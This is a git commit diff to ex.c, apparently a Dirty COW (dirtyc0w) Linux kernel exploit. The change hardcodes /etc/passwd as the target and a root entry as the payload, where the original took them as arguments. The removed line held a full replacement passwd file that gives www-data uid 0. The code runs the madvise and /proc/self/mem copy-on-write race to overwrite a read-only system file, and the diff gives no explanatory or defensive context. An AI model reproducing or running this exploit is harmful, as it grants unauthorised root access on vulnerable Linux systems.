8412687401634165b8c1754bf39ace479864a614
LOURC0D3 <lourc0d3@gmail.com>
2023-07-30 10:25:49 +0900

    1

--- ex.c
+++ ex.c
@@ -76,17 +76,16 @@ int main(int argc,char *argv[])
 /*
 You have to pass two arguments. File and Contents.
 */
-  if (argc<3) {
-  (void)fprintf(stderr, "%s\n",
-      "usage: dirtyc0w target_file new_content");
-  return 1; }
+  char file_name[] = "/etc/passwd";
+  char file_content[] = "root:x:0:0:root:/root:/bin/bash";
+
   pthread_t pth1,pth2;
 /*
 You have to open the file in read only mode.
 */
-  f=open(argv[1],O_RDONLY);
+  f=open(file_name,O_RDONLY);
   fstat(f,&st);
-  name=argv[1];
+  name=file_name;
 /*
 You have to use MAP_PRIVATE for copy-on-write mapping.
 > Create a private copy-on-write mapping.  Updates to the
@@ -103,8 +102,8 @@ You have to open with PROT_READ.
 /*
 You have to do it on two threads.
 */
-  pthread_create(&pth1,NULL,madviseThread,argv[1]);
-  pthread_create(&pth2,NULL,procselfmemThread,"root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:0:0:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\nlibuuid:x:100:101::/var/lib/libuuid:\nsyslog:x:101:104::/home/syslog:/bin/false\nmessagebus:x:102:106::/var/run/dbus:/bin/false\nlandscape:x:103:109::/var/lib/landscape:/bin/false\nsshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin\nsystem:x:1000:1000:system,,,:/home/system:/bin/bash\nmysql:x:105:113:MySQL Server,,,:/var/lib/mysql:/bin/false\ndev_38919:x:1001:1001:,,,:/home/dev_38919:/bin/bash");
+  pthread_create(&pth1,NULL,madviseThread,file_name);
+  pthread_create(&pth2,NULL,procselfmemThread,file_content);
 /*
 You have to wait for the threads to finish.
 */
